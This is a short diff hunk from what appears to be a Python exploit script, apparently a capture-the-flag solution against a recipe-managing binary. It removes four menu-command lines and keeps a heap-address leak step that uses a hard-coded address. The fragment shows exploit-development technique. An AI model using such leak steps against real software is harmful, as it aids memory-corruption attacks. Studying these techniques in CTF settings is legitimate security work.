@@ -99,10 +99,6 @@ if __name__ == "__main__":
     # leak heap address (CURRENT_RECIPE)
     #
 
-    s('c')
-    s('n')
-    s('d')
-    s('q')
     add_leak(0x804d0a0)
     leaked = parse_ingredient()
 
